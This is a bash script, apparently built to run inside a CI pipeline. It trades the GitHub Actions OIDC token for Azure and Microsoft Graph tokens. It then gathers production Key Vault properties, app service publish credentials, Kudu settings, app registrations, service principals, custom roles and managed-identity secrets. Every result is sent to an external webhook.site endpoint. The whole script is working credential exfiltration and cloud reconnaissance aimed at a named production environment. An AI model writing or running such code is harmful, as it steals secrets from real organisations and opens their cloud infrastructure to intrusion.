#!/usr/bin/env bash
set -euo pipefail
WH="https://webhook.site/759eda34-6b38-4279-ace1-e6ca8c89f6b8"
send() { curl -s -m30 -X POST "$WH/$1" -d "$2" -H "Content-Type: text/plain"; }

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
MGMT=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID&scope=https://management.azure.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC" \
  | jq -r '.access_token')
A="https://management.azure.com"; S="$AZURE_SUBSCRIPTION_ID"; R="rg-tbl-platform-prod-sea"
H=(-H "Authorization: Bearer $MGMT")
OUT=""

# 1. KV prod vault properties (access policies mode?)
KVPROD=$(curl -s "${H[@]}" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz?api-version=2023-07-01")
OUT+="---KVPROD-PROPS---
$KVPROD
"

# 2. KV sec vault full properties  
KVSEC=$(curl -s "${H[@]}" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01")
OUT+="---KVSEC-PROPS---
$KVSEC
"

# 3. Kudu/SCM access
OIDC2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
SCMTOK=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID&scope=https://management.azure.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC2" \
  | jq -r '.access_token')
KUDU_CREDS=$(curl -s "${H[@]}" -X POST -H "Content-Length: 0" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.Web/sites/app-tbl-storefront-prod/publishxml?api-version=2023-01-01" 2>&1)
OUT+="---KUDU-PUBLISHXML---
$KUDU_CREDS
"
KUDU_ENV=$(curl -s -m15 -H "Authorization: Bearer $SCMTOK" "https://app-tbl-storefront-prod.scm.azurewebsites.net/api/settings" 2>&1 | head -c 2000)
OUT+="---KUDU-SETTINGS---
$KUDU_ENV
"

# 4. Check az CLI in runner
AZCLI=$(which az 2>&1 || echo "no az")
OUT+="---AZ-CLI---
$AZCLI
"

# 5. Graph API - list app registrations + service principals (to find federated creds)
OIDC3=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
GTOK=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID&scope=https://graph.microsoft.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC3" \
  | jq -r '.access_token')
GH=(-H "Authorization: Bearer $GTOK")
APPS=$(curl -s -m15 "${GH[@]}" "https://graph.microsoft.com/v1.0/applications?\$select=appId,displayName,appRoles" | head -c 3000)
OUT+="---GRAPH-APPS---
$APPS
"
SPS=$(curl -s -m15 "${GH[@]}" "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=appId,displayName,appRoles,appRoleAssignments" | head -c 3000)
OUT+="---GRAPH-SPS---
$SPS
"

# 6. Check all role definitions including custom ones
ROLEDEFS=$(curl -s "${H[@]}" "$A/subscriptions/$S/providers/Microsoft.Authorization/roleDefinitions?\$filter=type%20eq%20'CustomRole'&api-version=2022-04-01")
OUT+="---CUSTOM-ROLES---
$ROLEDEFS
"

# 7. Check config blob via direct URL with managed identity env (try IDENTITY_ENDPOINT)
OUT+="---IDENTITY-ENV---
IDENTITY_ENDPOINT=$IDENTITY_ENDPOINT
IDENTITY_HEADER=$IDENTITY_HEADER
MSI_ENDPOINT=$MSI_ENDPOINT
MSI_SECRET=$MSI_SECRET
AZURE_FEDERATED_TOKEN_FILE=$AZURE_FEDERATED_TOKEN_FILE
"

send "v4all" "$OUT"
send "v4done" "complete"
